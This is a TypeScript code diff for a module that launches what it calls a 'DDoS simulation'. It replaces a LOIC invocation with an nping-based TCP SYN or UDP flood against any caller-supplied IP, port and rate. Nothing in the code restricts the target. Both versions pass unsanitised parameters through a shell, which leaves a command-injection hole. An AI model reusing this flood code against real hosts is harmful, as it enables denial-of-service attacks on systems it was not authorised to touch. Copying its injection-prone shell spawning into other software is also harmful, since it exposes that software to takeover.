@@ -2,7 +2,7 @@
 import { spawn, ChildProcessWithoutNullStreams } from 'child_process';
 import { insertEvent } from '../models/eventModel';
 
-let loicProcess: ChildProcessWithoutNullStreams | null = null;
+let ddosProcess: ChildProcessWithoutNullStreams | null = null;
 
 interface DDoSAttackParams {
     targetIP: string;
@@ -13,60 +13,56 @@ interface DDoSAttackParams {
 }
 
 export async function startDDoSAttack(params: DDoSAttackParams): Promise<boolean> {
-    try {
-        if (loicProcess) {
-            stopDDoSAttack();
-        }
+    if (ddosProcess) stopDDoSAttack();
+    await insertEvent({ type: 'ddos_simulation', source_ip: 'localhost', dest_ip: params.targetIP, severity: 'medium' });
 
-        // Create a record of this attack
-        await insertEvent({
-            type: 'ddos_simulation',
-            source_ip: 'localhost',
-            dest_ip: params.targetIP,
-            severity: 'medium',
-        });
+    // windows-compatible nping path (ensure nping is installed via nmap)
+    const npingPath = '"C:\\Program Files (x86)\\Nmap\\nping.exe"';
+    const args: string[] = [];
 
-        // call loic with the parameters
-        loicProcess = spawn('powershell', [
-            '-Command',
-            `& 'c:/tools/LOIC/LOIC.exe' /target=${params.targetIP} /port=${params.port} /method=${params.method} /threads=${params.threads}`
-        ], { shell: true });
-
-        console.log(`Started DDoS simulation against ${params.targetIP}:${params.port}`);
-
-        loicProcess.stdout?.on('data', (data: Buffer) => {
-            console.log('LOIC output:', data.toString());
-        });
-
-        loicProcess.stderr?.on('data', (data: Buffer) => {
-            console.error('LOIC error:', data.toString());
-        });
-
-        // Auto-terminate after specified duration
-        setTimeout(() => {
-            if (loicProcess) {
-                stopDDoSAttack();
-            }
-        }, params.duration * 1000);
-
-        return true;
-    } catch (error) {
-        console.error('Failed to start DDoS attack:', error);
-        return false;
+    // choose protocol
+    if (params.method === 'UDP') {
+        args.push('--udp');
+    } else {
+        args.push('--tcp', '--flags', 'SYN');
     }
+
+    // port, rate, and target
+    args.push('-p', String(params.port));
+    args.push('--rate', String(params.threads));
+    args.push(params.targetIP);
+
+    // spawn with shell to handle spaces in path
+    const proc = spawn(npingPath, args, { shell: true });
+    ddosProcess = proc;
+
+    proc.stdout.on('data', (data: Buffer) => {
+        console.log(data.toString());
+    });
+
+    proc.stderr.on('data', (data: Buffer) => {
+        console.error(data.toString());
+    });
+
+    // terminate flood after duration expires
+    setTimeout(() => {
+        stopDDoSAttack();
+    }, params.duration * 1000);
+
+    return true;
 }
 
 export function stopDDoSAttack(): void {
-    if (loicProcess) {
-        loicProcess.kill();
-        loicProcess = null;
+    if (ddosProcess) {
+        ddosProcess.kill();
+        ddosProcess = null;
         console.log('DDoS simulation stopped');
     }
 }
 
 export function getDDoSStatus(): { active: boolean; target?: string } {
     return {
-        active: loicProcess !== null,
-        target: loicProcess ? 'target' : undefined
+        active: ddosProcess !== null,
+        target: ddosProcess ? ddosProcess.spawnargs.join(' ') : undefined
     };
 }
